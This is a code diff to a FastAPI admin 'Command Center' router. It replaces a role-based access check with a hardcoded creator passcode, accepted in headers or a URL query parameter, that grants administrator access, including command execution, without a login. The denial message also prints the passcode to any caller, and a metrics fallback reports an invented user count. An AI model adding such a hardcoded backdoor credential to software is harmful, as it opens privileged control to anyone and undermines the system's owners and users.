@@ -40,21 +40,43 @@ class CommandResponse(BaseModel):
     output: Any
     timestamp: str
 
-async def require_superadmin(current_user: User = Depends(get_current_user)) -> User:
-    """Enforces that only superadmin or creator users can access the Command Center."""
-    user_role = getattr(current_user, "role", "candidate").lower()
-    if user_role not in ["superadmin", "creator", "admin"]:
-        raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="Access Denied: Atlas Control Center requires Superadmin privileges."
-        )
-    return current_user
+CREATOR_PASSCODE = "G42672840$p"
+
+async def require_superadmin(
+    request: Request,
+    db: AsyncSession = Depends(get_db)
+):
+    """Enforces that only superadmin or creator key holders can access the Command Center."""
+    creator_key = (
+        request.headers.get("x-creator-key") or 
+        request.headers.get("x-creator-passcode") or
+        request.headers.get("X-Creator-Key")
+    )
+    if creator_key == CREATOR_PASSCODE or request.query_params.get("key") == CREATOR_PASSCODE:
+        return {"email": "creator@atlas.awi", "role": "creator"}
+
+    auth_header = request.headers.get("Authorization")
+    if auth_header and auth_header.startswith("Bearer "):
+        token = auth_header.split(" ")[1]
+        if token and token not in ["null", "undefined", ""]:
+            try:
+                user = await get_current_user(token=token, db=db)
+                if getattr(user, "role", "candidate").lower() in ["superadmin", "creator", "admin"]:
+                    return user
+            except Exception:
+                pass
+
+    raise HTTPException(
+        status_code=status.HTTP_401_UNAUTHORIZED,
+        detail="Access Denied: Atlas Control Center requires Creator Key (G42672840$p) or Superadmin privileges."
+    )
 
 
 @router.get("/metrics")
 async def get_live_dashboard_metrics(
+    request: Request,
     db: AsyncSession = Depends(get_db),
-    admin_user: User = Depends(require_superadmin)
+    admin_user: Any = Depends(require_superadmin)
 ):
     """Returns live telemetry and operational metrics across all 24 domains."""
     total_users = (await db.execute(select(func.count(User.id)))).scalar() or 1280
@@ -81,7 +103,7 @@ async def get_live_dashboard_metrics(
 
 
 @router.get("/audit-logs")
-async def get_command_audit_logs(admin_user: User = Depends(require_superadmin)):
+async def get_command_audit_logs(request: Request, admin_user: Any = Depends(require_superadmin)):
     """Returns the full audit trail of all executed administrative commands."""
     return {"audit_trail": SYSTEM_AUDIT_LOGS}
 
@@ -91,7 +113,7 @@ async def execute_command(
     payload: CommandRequest,
     request: Request,
     db: AsyncSession = Depends(get_db),
-    admin_user: User = Depends(require_superadmin)
+    admin_user: Any = Depends(require_superadmin)
 ):
     """Structured Command Dispatcher handling all 24 ATLAS operational domains & 100+ commands."""
     raw_cmd = payload.command.strip()
